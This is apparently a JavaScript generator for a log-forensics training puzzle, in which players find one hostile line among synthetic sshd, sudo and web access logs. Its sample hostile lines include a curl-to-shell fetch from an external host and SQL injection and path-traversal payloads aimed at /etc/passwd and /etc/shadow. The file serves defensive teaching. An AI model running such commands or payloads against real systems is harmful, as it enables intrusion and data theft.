// Forensics: find the one hostile line in ordinary log output.
//
// The hostile line can land anywhere including first and last, addresses are
// drawn from a shared pool so no range is inherently guilty, and every incident
// ships with decoys that carry one of its signals without being the answer.

export const meta = { id: "logscan", name: "Needle", domain: "forensics" };

const USERS = ["deploy", "svc_backup", "jenkins", "mmorales", "rkhan", "twhite", "ops", "lchen"];
const INTERNAL = ["10.0.4.19", "10.0.4.22", "10.0.7.5", "10.0.7.61", "192.168.20.14", "10.0.9.3"];

// One pool for every external address. Remote staff and attackers both come
// from the internet, so the address alone never settles anything.
const EXTERNAL = [
  "203.0.113.7", "198.51.100.44", "185.220.101.6", "45.155.205.233",
  "192.0.2.19", "198.51.100.9", "203.0.113.142", "192.0.2.201",
  "198.51.100.77", "203.0.113.55",
];

const PATHS = ["/api/orders", "/health", "/api/users", "/static/app.js", "/login", "/api/reports", "/assets/logo.svg"];
const AGENTS = ["Mozilla/5.0", "Mozilla/5.0", "curl/8.4.0", "python-requests/2.31", "Go-http-client/2.0"];

export function generate(rng, difficulty = 2) {
  const kind = rng.pick(["bruteforce", "sudo", "webattack"]);
  const noise = { 1: [6, 9], 2: [12, 16], 3: [20, 27] }[difficulty] || [12, 16];
  const decoyCount = { 1: 0, 2: 1, 3: 2 }[difficulty] ?? 1;

  const pool = rng.shuffle(EXTERNAL);
  let poolAt = 0;
  const nextExternal = () => pool[poolAt++ % pool.length];

  const specs = []; // { text, hostile }
  const add = (text) => specs.push({ text, hostile: false });

  let hints, explain, brief, situation;

  if (kind === "bruteforce") {
    const attacker = nextExternal();
    const noisyButHarmless = nextExternal(); // fails a lot, never gets in
    const remoteStaff = nextExternal(); // external, but uses a key like everyone should
    const victim = rng.pick(USERS);

    for (let i = 0; i < rng.int(noise[0], noise[1]); i++) {
      const roll = rng.next();
      if (roll < 0.45) {
        add(`sshd[${rng.int(1000, 9999)}]: Accepted publickey for ${rng.pick(USERS)} from ${rng.pick(INTERNAL)} port ${rng.int(40000, 60000)}`);
      } else if (roll < 0.8) {
        add(`sshd[${rng.int(1000, 9999)}]: Failed password for ${rng.bool(0.5) ? "invalid user " : ""}${rng.pick(USERS)} from ${rng.bool(0.5) ? attacker : noisyButHarmless} port ${rng.int(40000, 60000)}`);
      } else {
        add(`sshd[${rng.int(1000, 9999)}]: Accepted publickey for ${rng.pick(USERS)} from ${remoteStaff} port ${rng.int(40000, 60000)}`);
      }
    }
    // Decoy: the loudest attacker on the page never actually succeeds.
    for (let i = 0; i < decoyCount * 3; i++) {
      add(`sshd[${rng.int(1000, 9999)}]: Failed password for invalid user ${rng.pick(["root", "admin", "test", "oracle"])} from ${noisyButHarmless} port ${rng.int(40000, 60000)}`);
    }

    specs.push({
      text: `sshd[${rng.int(1000, 9999)}]: Accepted password for ${victim} from ${attacker} port ${rng.int(40000, 60000)}`,
      hostile: true,
    });

    brief = "One login succeeded that should not have. Find it.";
    situation = "An account was accessed from outside and nobody has explained it";
    hints = [
      "Failed logins are constant background noise. A success only matters in context.",
      "Two external addresses are failing here. Only one of them eventually stops failing.",
      "You want an accepted password from an address that was failing, when everyone legitimate uses a key.",
    ];
    explain = {
      method:
        "Failures alone mean nothing, the internet knocks on every open port all day. The signal is a success from an address with a wall of failures behind it, using password auth when every legitimate session on the page uses a key.",
      real:
        "This is password guessing that landed. The noisiest attacker is usually not the one that got in, which is exactly why alerting on failure counts produces so much wasted work.",
    };
  } else if (kind === "sudo") {
    const rogue = rng.pick(USERS);
    const host = nextExternal();

    for (let i = 0; i < rng.int(noise[0], noise[1]); i++) {
      const cmd = rng.pick([
        "/usr/bin/systemctl restart app",
        "/usr/bin/rsync -a /data /backup",
        "/usr/bin/tail -f /var/log/app.log",
        "/usr/bin/apt-get install -y jq",
        "/bin/journalctl -u nginx",
      ]);
      add(`sudo: ${rng.pick(USERS)} : TTY=pts/${rng.int(0, 3)} ; PWD=${rng.pick(["/srv/app", "/var/backups", "/home/ops", "/etc"])} ; USER=root ; COMMAND=${cmd}`);
    }
    // Decoy: a genuinely odd looking command that is ordinary provisioning.
    for (let i = 0; i < decoyCount; i++) {
      add(`sudo: ${rng.pick(USERS)} : TTY=pts/${rng.int(0, 3)} ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c curl http://10.0.1.10/bootstrap.sh -o /tmp/b.sh`);
    }

    specs.push({
      text: `sudo: ${rogue} : TTY=pts/${rng.int(0, 3)} ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c curl http://${host}/s.sh | sh`,
      hostile: true,
    });

    brief = "One privilege escalation does not belong. Find it.";
    situation = "Someone ran something as root that nobody has claimed";
    hints = [
      "Every line here is a root command. Only one of them is not administration.",
      "More than one line fetches a file. Check where each one fetches from, and what happens to it after.",
      "You want a remote script piped straight into a shell, from an address that is not ours.",
    ];
    explain = {
      method:
        "Legitimate sudo is repetitive: restart a service, run a backup, install a package. Downloading a file is not automatically hostile, provisioning does it constantly. Piping a remote script directly into a shell, from an external host, is the line that has no innocent reading.",
      real:
        "Curl piped to shell is the standard second stage of a Linux compromise. The difference between the decoy and the answer, saving to disk against executing inline, is the difference most detection rules get wrong.",
    };
  } else {
    const attacker = nextExternal();
    const scanner = nextExternal();
    const attack = rng.pick([
      "/api/users?id=1%27%20OR%20%271%27=%271",
      "/static/../../../../etc/passwd",
      "/api/reports?file=....//....//etc/shadow",
      "/api/orders?sort=id%3BDROP%20TABLE",
    ]);

    for (let i = 0; i < rng.int(noise[0], noise[1]); i++) {
      add(`${rng.bool(0.7) ? rng.pick(INTERNAL) : nextExternal()} "GET ${rng.pick(PATHS)} HTTP/1.1" ${rng.pick([200, 200, 200, 304, 404])} ${rng.int(180, 9000)} "${rng.pick(AGENTS)}"`);
    }
    // Decoys: a bot spraying 404s, and a 500 that is just an application bug.
    for (let i = 0; i < decoyCount; i++) {
      add(`${scanner} "GET ${rng.pick(["/wp-login.php", "/.env", "/phpmyadmin/"])} HTTP/1.1" 404 ${rng.int(120, 400)} "${rng.pick(AGENTS)}"`);
      add(`${rng.pick(INTERNAL)} "GET /api/reports HTTP/1.1" 500 ${rng.int(200, 800)} "Mozilla/5.0"`);
    }

    specs.push({
      text: `${attacker} "GET ${attack} HTTP/1.1" 500 ${rng.int(200, 900)} "${rng.pick(AGENTS)}"`,
      hostile: true,
    });

    brief = "One request is an attack, not a user. Find it.";
    situation = "The application threw errors and one of the requests behind them was deliberate";
    hints = [
      "Plenty of noise here is harmless. Bots probe for files that were never there and get a clean 404.",
      "A 500 on its own is often just a bug. Look at what was actually in the request that caused it.",
      "You want encoded quotes or stacked traversal sequences inside the path itself.",
    ];
    explain = {
      method:
        "Real users request real paths. Scanners spraying for /.env are background noise and get 404s. A 500 alone is usually your own bug. The finding is a malformed path, encoded quotes or dot-dot-slash sequences, that made the application fail.",
      real:
        "That 500 is the attacker learning your stack, and the error it returned is usually what they use next. Separating deliberate malformed input from ordinary bot noise is most of what a web log triage job is.",
    };
  }

  // Place the hostile line anywhere, including first and last, then lay the
  // clock over the finished order so the sequence still reads chronologically.
  const hostile = specs.pop();
  const lines = rng.shuffle(specs);
  lines.splice(rng.int(0, lines.length), 0, hostile);

  let t = rng.int(3, 20) * 3600 + rng.int(0, 3540);
  const stamped = lines.map((l) => {
    t += rng.int(2, 47);
    const hh = String(Math.floor(t / 3600) % 24).padStart(2, "0");
    const mm = String(Math.floor(t / 60) % 60).padStart(2, "0");
    const ss = String(t % 60).padStart(2, "0");
    return { text: `${hh}:${mm}:${ss} ${l.text}`, hostile: l.hostile };
  });

  const answerIndex = stamped.findIndex((l) => l.hostile);

  return {
    meta,
    difficulty,
    brief,
    situation,
    mode: "pick",
    solution: `Line ${answerIndex + 1}`,
    hints,
    explain: {
      ...explain,
      next: { label: "Work real log analysis rooms on TryHackMe", url: "https://tryhackme.com" },
    },
    check: (value) => Number(value) === answerIndex,
    render(root, onPick) {
      root.innerHTML = `<p class="muted">${stamped.length} lines. Click the hostile one.</p>`;
      const list = document.createElement("div");
      list.className = "loglist";
      stamped.forEach((line, i) => {
        const row = document.createElement("button");
        row.type = "button";
        row.className = "logline";
        row.innerHTML = `<span class="ln">${String(i + 1).padStart(2, "0")}</span><code>${line.text}</code>`;
        row.addEventListener("click", () => {
          list.querySelectorAll(".logline").forEach((n) => n.classList.remove("selected"));
          row.classList.add("selected");
          onPick(i);
        });
        list.appendChild(row);
      });
      root.appendChild(list);
    },
  };
}
